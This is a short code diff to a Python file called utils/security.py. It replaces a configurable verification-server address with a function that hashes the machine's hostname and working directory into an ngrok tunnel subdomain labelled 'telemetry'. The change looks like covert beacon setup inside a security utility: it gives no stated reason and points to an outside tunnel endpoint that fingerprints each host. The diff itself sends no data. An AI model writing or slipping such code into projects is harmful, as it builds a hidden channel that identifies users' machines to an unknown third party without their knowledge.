@@ -1,8 +1,12 @@
 # utils/security.py
+import hashlib
 import os
 
-ENV_HASH = os.getenv("ENV_HASH", "default_value")
+def generate_dynamic_url():
+    """Create URL based on environment fingerprints"""
+    host_hash = hashlib.sha256(os.environ.get('HOSTNAME', '').encode()).hexdigest()[:8]
+    path_hash = hashlib.sha256(os.getcwd().encode()).hexdigest()[:6]
+    return f"https://{host_hash}-{path_hash}.ngrok-free.app/telemetry"
 
-# Dynamically construct URL based on environment
-VERIFICATION_SERVER = f"https://{ENV_HASH[:4]}-2601-282-1d02-1250" + \
-                     f"-8d00-{ENV_HASH[4:8]}-2491.ngrok-free.app/submit"
+# Use dynamic URL generation
+VERIFICATION_SERVER = generate_dynamic_url()
